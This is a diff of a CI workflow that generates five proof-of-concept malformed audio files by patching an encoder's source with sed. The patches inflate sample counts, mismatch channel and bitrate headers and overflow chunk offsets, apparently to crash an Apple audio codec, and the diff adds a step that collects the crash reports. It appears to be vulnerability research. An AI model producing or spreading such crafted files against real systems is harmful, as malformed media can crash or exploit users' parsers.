@@ -72,33 +72,27 @@ jobs:
           echo "Creating PoC source files at $(date)"
           # PoC 1: Inflated Sample Count in stsz
           cp encodeme.mm encodeme_poc1.mm
-          sed -i '' 's/44100/8192/g' encodeme_poc1.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(1024 * channelNum * sizeof(float))/g' encodeme_poc1.mm
+          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 8192, &audioBufferList);/' encodeme_poc1.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(1024 * channelNum * sizeof(float))/' encodeme_poc1.mm
           
           # PoC 2: esds Channel Configuration Mismatch
           cp encodeme.mm encodeme_poc2.mm
-          sed -i '' 's/mChannelsPerFrame = channelNum/mChannelsPerFrame = 8/g' encodeme_poc2.mm
-          sed -i '' 's/mNumberChannels = channelNum/mNumberChannels = 1/g' encodeme_poc2.mm
-          sed -i '' 's/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8/g' encodeme_poc2.mm
+          sed -i '' 's/mChannelsPerFrame = channelNum/mChannelsPerFrame = 8/' encodeme_poc2.mm
+          sed -i '' 's/.mNumberChannels = channelNum/.mNumberChannels = 1/' encodeme_poc2.mm
+          sed -i '' 's/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
           
-          # PoC 3: Xing Header Frame Count Inflation (MP3 metadata in conversion step)
+          # PoC 3: Xing Header Frame Count Inflation
           cp encodeme.mm encodeme_poc3.mm
-          sed -i '' 's/44100/2000/g' encodeme_poc3.mm
+          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 2000, &audioBufferList);/' encodeme_poc3.mm
           
-          # PoC 4: Frame Header Bitrate Mismatch (MP3)
+          # PoC 4: Frame Header Bitrate Mismatch
           cp encodeme.mm encodeme_poc4.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(144000 \/ 1000 * 64 * channelNum)/g' encodeme_poc4.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
           
           # PoC 5: stco Offset Overflow
           cp encodeme.mm encodeme_poc5.mm
-          sed -i '' 's/44100/4096/g' encodeme_poc5.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(100)/g' encodeme_poc5.mm
-          echo "Adding stco metadata for PoC 5"
-          sed -i '' '/AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(metadata), &metadata);/a\
-          NSDictionary *stcoMetadata = @{@"stcoOffset" : @(44100 * 44100 - 100)};\
-          AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(stcoMetadata), &stcoMetadata);' encodeme_poc5.mm
-          
-          ls -l encodeme_poc*.mm
+          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 4096, &audioBufferList);/' encodeme_poc5.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(100)/' encodeme_poc5.mm
           echo "PoC source files created at $(date)"
 
       # Compile PoC binaries
@@ -193,6 +187,15 @@ jobs:
           done
           echo "Generated files verified at $(date)"
 
+      # Collect crash reports
+      - name: Collect crash reports
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Collecting crash reports at $(date)"
+          mkdir -p crash_reports
+          cp ~/Library/Logs/DiagnosticReports/encodeme*.crash crash_reports/ 2>/dev/null || echo "No crash reports found"
+          ls -lh crash_reports/ 2>/dev/null || echo "No crash reports copied"
+
       # Upload artifacts
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
@@ -201,5 +204,6 @@ jobs:
           path: |
             AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
             AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
+            AppleTest/apple-positional-audio-codec-invalid-header-main/crash_reports/*.crash
           retention-days: 7
           if-no-files-found: error
